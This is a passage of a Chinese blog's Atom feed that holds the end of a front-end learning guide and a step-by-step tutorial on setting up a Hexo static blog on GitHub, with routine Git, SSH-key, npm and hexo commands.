&lt;h4 id=&quot;前端的定位&quot;&gt;&lt;a href=&quot;#前端的定位&quot; class=&quot;headerlink&quot; title=&quot;前端的定位&quot;&gt;&lt;/a&gt;前端的定位&lt;/h4&gt;&lt;p&gt;前端的定位关乎到你需要吸收什么样的知识和技能，决定在技术世界里你对什么需要格外敏感。如果你认为前端仅仅停留在切页面，实现交互和视觉的要求，那你对前端的认识还停留在初级阶段。阿里终面的时候我问了考官这么个问题：前端技术日新月异，范围越扩越宽，标准越来越丰富，似乎任何一个触角都能伸出很远。怎么给前端一个合适的定位？考官给我分析了半天，然后总结成一句话，就是用户和网站的联结者，用户体验的创造者（原话不是这样，但大体是这个意思）。也就是说前端的终极目标其实就是创造用户体验，提升用户体验，&lt;strong&gt;以用户体验为中心&lt;/strong&gt;。不管你是从交互设计上下手，还是从性能优化出发，或者改进工作流提升工作流效率，最终都是为了创造和提升用户体验，最终都要体现到用户体验这一点上来。我认为这个总结非常有道理（当然“用户体验”这个词太宽泛了，并且不仅仅是前端工程师的范畴，比如开发后台的时候对一个数据处理过程进行优化，提升了整体性能，这也是对用户体验的一个提升）。&lt;/p&gt;
&lt;p&gt;现在的前端工程师做到一定阶段不可避免会接触到很多比切页面、实现视觉要求、实现交互等更深入的问题，比如前端自动化、图像编程、性能优化等等，再往后推一点就是PHP/JSP/ASP/nodeJs，过去后端模板一般属于后端的范畴，现在随着&lt;a href=&quot;https://github.com/lifesinger/lifesinger.github.com/issues/184&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;前端架构的演进&lt;/a&gt;，可能会让你去写后端模板的代码，需要用到后端语言（PHP/Java/C#等），这就是所谓&lt;strong&gt;大前端&lt;/strong&gt;（然而这与前端的定位并不是相背离的，大前端处理的依然是与用户接触的部分，仍然是对用户体验的优化）。可能最常见或者被谈论最多的就是node，其实这几种技术选型都可以，bat三家据说百度用PHP比较多，阿里用node比较多。&lt;/p&gt;
&lt;p&gt;玉伯在&lt;a href=&quot;https://github.com/lifesinger/lifesinger.github.com/labels/blog&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;他的博客&lt;/a&gt;里提过所谓全端是横向的，全栈是纵向的。&lt;strong&gt;全端&lt;/strong&gt;即所有的终端说白了都是前端，因为都关乎到用户体验，直接和用户接触。适应多终端的开发，要求你在web前端的基础上，可能还要去扩展android开发和ios开发的知识，好在由于hybrid开发方式的流行，对使用native语言开发的技能会要求的不那么深入。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;全栈&lt;/strong&gt;可以说是最适合初创公司的一种发展类型，广义上认为是从前端干到后端，从开发干到运维，这种就不说了，一般人应该不会想要去往这个方向发展，想要成为这种意义上的full-stack dev的，可能用不着来看我这篇文章了；而狭义上的全栈特指使用js语言从前端写到架设在nodeJs上的后端，前后端统一语言，统一编程模型，甚至公用同一套代码。更多了解全栈开发可以看看玉伯这篇&lt;a href=&quot;https://github.com/lifesinger/lifesinger.github.com/issues/185&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;说说全栈工程师&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;以上是我对前端以及衍生出来的技术路线的一些浅薄理解，学习一个领域掌握它的整体上的走向和趋势还是挺重要的。另外如果想要对前端学习方向、职业成长路径有一个整体的认识，推荐看看拔赤总结的这篇&lt;a href=&quot;https://github.com/jayli/jayli.github.com/issues/1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;前端开发十日谈&lt;/a&gt;。&lt;/p&gt;
&lt;h4 id=&quot;最后&quot;&gt;&lt;a href=&quot;#最后&quot; class=&quot;headerlink&quot; title=&quot;最后&quot;&gt;&lt;/a&gt;最后&lt;/h4&gt;&lt;p&gt;贡献几个对前端学习、面试有帮助的链接：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/darcyclarke/Front-end-Developer-Interview-Questions&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;前端面试问题合集（Front-end-Developer-Interview-Questions）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/JacksonTian/fks&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;前端技能汇总（JacksonTian）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.f2er.info/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;另一张前端技能汇总图&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://book.douban.com/doulist/13701898/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;前端那点事儿（书列）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;byr论坛yiyizym的建议&quot;&gt;&lt;a href=&quot;#byr论坛yiyizym的建议&quot; class=&quot;headerlink&quot; title=&quot;byr论坛yiyizym的建议&quot;&gt;&lt;/a&gt;byr论坛yiyizym的建议&lt;/h3&gt;&lt;p&gt;与grunt相比，学习gulp会比较简单&lt;/p&gt;
&lt;p&gt;做SPA的话，推荐backbone.js和 backbone.marionette.js&lt;/p&gt;
&lt;p&gt;翻墙不用折腾，花十块钱买一个月的 红杏。&lt;/p&gt;
&lt;p&gt;把基础打扎实了再学这些都没问题。&lt;/p&gt;
&lt;p&gt;html 没什么好说的，有空学学html5。&lt;/p&gt;
&lt;p&gt;css 尽量看&lt;a href=&quot;http://www.w3.org/TR/CSS21/cover.html#minitoc&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;文档&lt;/a&gt; ，因为很多中文资料都各执一辞，看多了反而会糊涂。&lt;/p&gt;
&lt;p&gt;有个&lt;a href=&quot;http://caniuse.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;网站&lt;/a&gt;可以查找html/css标签、属性在各个浏览器中的支持情况，挺好用的。&lt;/p&gt;
&lt;p&gt;javascript 就看 javascript高级程序设计 。不过这么厚的书看过就会忘。对javascript核心概念的讲解：对象/原型链/         构造函数/执行上下文/作用域链/闭包/this，&lt;a href=&quot;http://weizhifeng.net/javascript-the-core.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这里&lt;/a&gt;有篇不错的文章。&lt;/p&gt;
&lt;p&gt;有闲情可以看看 ecmascript 6，计划明年6月就发布啦。&lt;a href=&quot;http://es6.ruanyifeng.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;阮一峰的网站&lt;/a&gt;有入门资料。&lt;/p&gt;
&lt;p&gt;jquery 有很多 API,&lt;a href=&quot;http://www.css88.com/jqapi-1.9/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这个网站&lt;/a&gt;可以方便查到。有时间弄清楚jquery deferred 的用法。&lt;/p&gt;
&lt;p&gt;多给 sublimetext 装插件，比如说检查代码错误的，新建目录文件的，整理代码的。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;转载请注明出处: &lt;a href=&quot;https://github.com/qiu-deqing/FE-learning&quot;&gt;https://github.com/qiu-deqing/FE-learning&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;FE-learning&quot;&gt;&lt;a href=&quot;#FE-learning&quot; class=&quot;headerlink&quot; title=&quot;FE-learning&quot;&gt;&lt;/a&gt;FE-learning&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/qiu-deqing/FE-learning/master/img/FE.jpg&quot; alt=&quot;FE&quot;&gt;&lt;/p&gt;
&lt;p&gt;结合个人经历总结的前端入门方法，总结从零基础到具备前端基本技能的道路、学习方法、资料。由于能力有限，不能保证面面俱到，只是作为入门参考，面向初学者，让初学者少走弯路。&lt;/p&gt;
&lt;p&gt;互联网的快速发展和激烈竞争，用户体验成为一个重要的关注点，导致专业前端工程师成为热门职业，各大公司对前端工程师的需求量都很大，要求也越来越高，优秀的前端工程师更是稀缺。个人感觉前端入门相对容易，但是也需要系统地认真学习，在打好基础后坚持学习，成为优秀前端工程师也只是时间问题。&lt;br&gt;
    
    </summary>
    
    
      <category term="Web开发" scheme="http://qrframe.com/tags/Web%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>使用Hexo在github上搭建个人网站——操作记录</title>
    <link href="http://qrframe.com/2016/07/13/%E4%BD%BF%E7%94%A8Hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%AB%99%E7%9A%84%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/"/>
    <id>http://qrframe.com/2016/07/13/使用Hexo在github上搭建个人网站的操作记录/</id>
    <published>2016-07-13T09:11:42.000Z</published>
    <updated>2016-07-14T03:10:55.722Z</updated>
    
    <content type="html">&lt;p&gt;咋也准备跟着潮流，使用Hexo在github上搭建一个免费的静态博客。以下就是我自己在搭建网站过程中记录的内容。&lt;/p&gt;
&lt;h2 id=&quot;前提条件&quot;&gt;&lt;a href=&quot;#前提条件&quot; class=&quot;headerlink&quot; title=&quot;前提条件&quot;&gt;&lt;/a&gt;前提条件&lt;/h2&gt;&lt;h3 id=&quot;1、NodeJs&quot;&gt;&lt;a href=&quot;#1、NodeJs&quot; class=&quot;headerlink&quot; title=&quot;1、NodeJs&quot;&gt;&lt;/a&gt;1、NodeJs&lt;/h3&gt;&lt;p&gt;到&lt;a href=&quot;https://nodejs.org&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;NodeJs官网&lt;/a&gt;下载对应平台的最新版本。安装结束后，在cmd控制台输入：&lt;code&gt;node -v&lt;/code&gt;,出现版本提示表示安装成功。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;2、Git&quot;&gt;&lt;a href=&quot;#2、Git&quot; class=&quot;headerlink&quot; title=&quot;2、Git&quot;&gt;&lt;/a&gt;2、Git&lt;/h3&gt;&lt;blockquote&gt;
&lt;h4 id=&quot;在Windows上安装Git&quot;&gt;&lt;a href=&quot;#在Windows上安装Git&quot; class=&quot;headerlink&quot; title=&quot;在Windows上安装Git&quot;&gt;&lt;/a&gt;在Windows上安装Git&lt;/h4&gt;&lt;/blockquote&gt;
&lt;p&gt;从&lt;a href=&quot;https://git-for-windows.github.io&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://git-for-windows.github.io&lt;/a&gt;下载（网速慢的同学请移步&lt;a href=&quot;http://pan.baidu.com/s/1skFLrMt#path=%252Fpub%252Fgit&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;国内镜像&lt;/a&gt;），然后按默认选项安装即可。安装结束后，在开始菜单里找到“Git”-&amp;gt;“Git Bash”，蹦出一个类似命令行窗口的东西，就说明Git安装成功！&lt;br&gt;安装完成后，还需要最后一步设置，在命令行输入：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ git config --global user.name &amp;quot;Your Name&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$ git config --global user.email &amp;quot;email@example.com&amp;quot;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。&lt;br&gt;注意git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h4 id=&quot;为github帐号添加SSH-keys&quot;&gt;&lt;a href=&quot;#为github帐号添加SSH-keys&quot; class=&quot;headerlink&quot; title=&quot;为github帐号添加SSH keys&quot;&gt;&lt;/a&gt;为github帐号添加SSH keys&lt;/h4&gt;&lt;/blockquote&gt;
&lt;p&gt;使用git clone命令从github上同步github上的代码库时，如果使用SSH链接（如我自己的esesgrid项目：git@github.com:hmilycc/esesgrid.git），而你的SSH key没有添加到github帐号设置中，系统会报下面的错误：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Permission denied (publickey).fatal: Could not read from remote repository.
Please make sure you have the correct access rightsand the repository exists.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这时需要在本地创建SSH key，然后将生成的SSH key文件内容添加到github帐号上去。创建SSH key的方法很简单，执行如下命令就可以：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ ssh-keygen -t rsa -C &amp;quot;qrframe.com&amp;quot;//注意。qrframe.com为用户名&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后系统提示输入文件保存位置等信息，连续敲三次回车即可，生成的SSH key文件保存在中～/.ssh/id_rsa.pub&lt;br&gt;接着拷贝.ssh/id_rsa.pub文件内的所以内容，将它粘帖到github帐号管理中的添加SSH key界面中。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h4 id=&quot;git出现：warning-LF-will-be-replaced-by-CRLF&quot;&gt;&lt;a href=&quot;#git出现：warning-LF-will-be-replaced-by-CRLF&quot; class=&quot;headerlink&quot; title=&quot;git出现：warning: LF will be replaced by CRLF&quot;&gt;&lt;/a&gt;git出现：warning: LF will be replaced by CRLF&lt;/h4&gt;&lt;/blockquote&gt;
&lt;p&gt;windows中的换行符为 CRLF， 而在linux下的换行符为LF，所以在执行add . 时出现提示，解决办法：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ git config --global core.autocrlf false  //禁用自动转换&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;安装Hexo&quot;&gt;&lt;a href=&quot;#安装Hexo&quot; class=&quot;headerlink&quot; title=&quot;安装Hexo&quot;&gt;&lt;/a&gt;安装Hexo&lt;/h2&gt;&lt;p&gt;创建一个文件夹,如blog。定位到新建的blog文件夹，使用 npm 即可完成 Hexo 的安装：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ npm install -g hexo-cli&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ hexo init &amp;lt;folder&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$ npm install&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;新建完成后，指定文件夹的目录如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.
├── _config.yml
├── package.json
├── scaffolds
├── source
|   ├── _drafts
|   └── _posts
└── themes
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;config-yml&quot;&gt;&lt;a href=&quot;#config-yml&quot; class=&quot;headerlink&quot; title=&quot;_config.yml&quot;&gt;&lt;/a&gt;_config.yml&lt;/h3&gt;&lt;p&gt;网站的 &lt;a href=&quot;https://hexo.io/zh-cn/docs/configuration.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;配置&lt;/a&gt; 信息，您可以在此配置大部分的参数。&lt;/p&gt;
&lt;h3 id=&quot;package-json&quot;&gt;&lt;a href=&quot;#package-json&quot; class=&quot;headerlink&quot; title=&quot;package.json&quot;&gt;&lt;/a&gt;package.json&lt;/h3&gt;&lt;p&gt;应用程序的信息。&lt;a href=&quot;http://embeddedjs.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;EJS&lt;/a&gt;, &lt;a href=&quot;http://learnboost.github.io/stylus/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Stylus&lt;/a&gt; 和 &lt;a href=&quot;http://daringfireball.net/projects/markdown/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Markdown&lt;/a&gt; renderer 已默认安装，您可以自由移除。&lt;/p&gt;
&lt;h3 id=&quot;scaffolds&quot;&gt;&lt;a href=&quot;#scaffolds&quot; class=&quot;headerlink&quot; title=&quot;scaffolds&quot;&gt;&lt;/a&gt;scaffolds&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://hexo.io/zh-cn/docs/writing.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;模版&lt;/a&gt; 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。&lt;/p&gt;
&lt;h3 id=&quot;source&quot;&gt;&lt;a href=&quot;#source&quot; class=&quot;headerlink&quot; title=&quot;source&quot;&gt;&lt;/a&gt;source&lt;/h3&gt;&lt;p&gt;资源文件夹是存放用户资源的地方。除 &lt;em&gt;posts 文件夹之外，开头命名为 &lt;/em&gt; (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。&lt;strong&gt;Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&quot;themes&quot;&gt;&lt;a href=&quot;#themes&quot; class=&quot;headerlink&quot; title=&quot;themes&quot;&gt;&lt;/a&gt;themes&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://hexo.io/zh-cn/docs/themes.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;主题&lt;/a&gt; 文件夹。Hexo 会根据主题来生成静态页面。&lt;/p&gt;
&lt;h3 id=&quot;常用指令&quot;&gt;&lt;a href=&quot;#常用指令&quot; class=&quot;headerlink&quot; title=&quot;常用指令&quot;&gt;&lt;/a&gt;常用指令&lt;/h3&gt;&lt;h4 id=&quot;1、new&quot;&gt;&lt;a href=&quot;#1、new&quot; class=&quot;headerlink&quot; title=&quot;1、new&quot;&gt;&lt;/a&gt;1、new&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ hexo new [layout] &amp;lt;title&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;新建一篇文章。如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。&lt;/p&gt;
&lt;h4 id=&quot;2、generate&quot;&gt;&lt;a href=&quot;#2、generate&quot; class=&quot;headerlink&quot; title=&quot;2、generate&quot;&gt;&lt;/a&gt;2、generate&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ hexo generate&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;生成静态文件。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;选项&lt;/th&gt;
&lt;th style=&quot;text-align:left&quot;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-d, –deploy&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;文件生成后立即部署网站&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-w, –watch&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;监视文件变动&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;3、publish&quot;&gt;&lt;a href=&quot;#3、publish&quot; class=&quot;headerlink&quot; title=&quot;3、publish&quot;&gt;&lt;/a&gt;3、publish&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ hexo publish [layout] &amp;lt;filename&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发表草稿。&lt;/p&gt;
&lt;h4 id=&quot;4、server&quot;&gt;&lt;a href=&quot;#4、server&quot; class=&quot;headerlink&quot; title=&quot;4、server&quot;&gt;&lt;/a&gt;4、server&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ hexo server&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;启动服务器。默认情况下，访问网址为： &lt;a href=&quot;http://localhost:4000/。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://localhost:4000/。&lt;/a&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;选项&lt;/th&gt;
&lt;th style=&quot;text-align:left&quot;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-p, –port&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;重设端口&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-s, –static&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;只使用静态文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-l, –log&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;启动日记记录，使用覆盖记录格式&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;5、deploy&quot;&gt;&lt;a href=&quot;#5、deploy&quot; class=&quot;headerlink&quot; title=&quot;5、deploy&quot;&gt;&lt;/a&gt;5、deploy&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ hexo deploy&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;部署网站。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th style=&quot;text-align:left&quot;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-g, –generate&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;部署之前预先生成静态文件&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;6、clean&quot;&gt;&lt;a href=&quot;#6、clean&quot; class=&quot;headerlink&quot; title=&quot;6、clean&quot;&gt;&lt;/a&gt;6、clean&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ hexo clean&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;清除缓存文件 (db.json) 和已生成的静态文件 (public)。&lt;/p&gt;
&lt;h4 id=&quot;7、version&quot;&gt;&lt;a href=&quot;#7、version&quot; class=&quot;headerlink&quot; title=&quot;7、version&quot;&gt;&lt;/a&gt;7、version&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ hexo version&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;显示 Hexo 版本。&lt;/p&gt;
&lt;h2 id=&quot;配置Github&quot;&gt;&lt;a href=&quot;#配置Github&quot; class=&quot;headerlink&quot; title=&quot;配置Github&quot;&gt;&lt;/a&gt;配置Github&lt;/h2&gt;&lt;p&gt;安装 hexo-deployer-git。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ npm install hexo-deployer-git --save&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;修改配置。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;deploy:
  type: git
  repo: &amp;lt;repository url&amp;gt;
  branch: [branch]
  message: [message]
&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th style=&quot;text-align:left&quot;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;repo&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;库（Repository）地址&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;branch&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;message&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;自定义提交信息 (默认为 Site updated: { { now(‘YYYY-MM-DD HH:mm:ss’) } })&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&quot;使用自定义主题：indigo&quot;&gt;&lt;a href=&quot;#使用自定义主题：indigo&quot; class=&quot;headerlink&quot; title=&quot;使用自定义主题：indigo&quot;&gt;&lt;/a&gt;使用自定义主题：indigo&lt;/h2&gt;&lt;p&gt;Material Design 风格的Hexo主题，基于 Hexo 3.0+ 制作。&lt;/p&gt;
